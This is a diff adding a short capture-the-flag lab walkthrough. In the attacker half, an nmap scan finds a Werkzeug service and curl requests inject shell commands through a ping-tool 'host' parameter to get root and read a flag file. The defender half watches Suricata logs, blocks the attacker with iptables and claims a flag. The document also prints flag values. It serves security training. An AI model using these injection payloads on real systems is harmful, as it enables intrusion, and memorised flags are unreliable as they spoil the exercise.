@@ -1,0 +1,25 @@
+# 1 — Discover the service
+nmap -p 5000 victim
+# → 5000/tcp open  http  Werkzeug httpd
+
+# 2 — Confirm RCE
+curl "http://victim:5000/ping-tool?host=;id"
+# → uid=0(root) gid=0(root)  
+
+# 3 — Read the flag
+curl "http://victim:5000/ping-tool?host=;cat\${IFS}/root/rce_flag.txt"
+
+FLAG{rce_839a94389a9a1038}
+
+
+# See attack traffic rolling in from Suricata...
+tail -f /var/log/suricata/fast.log
+
+# Block the attacker (IP is shown right in Suricata logs)
+iptables -A INPUT -s <attacker_ip> -j DROP
+
+# Claim the flag
+bash /check_defender.sh
+# → [+] ★  HERE IS YOUR FLAG: FLAG{defender_3f9a12b7...}
+
+FLAG{defender_5f2b4cfb9d63ad0e}	
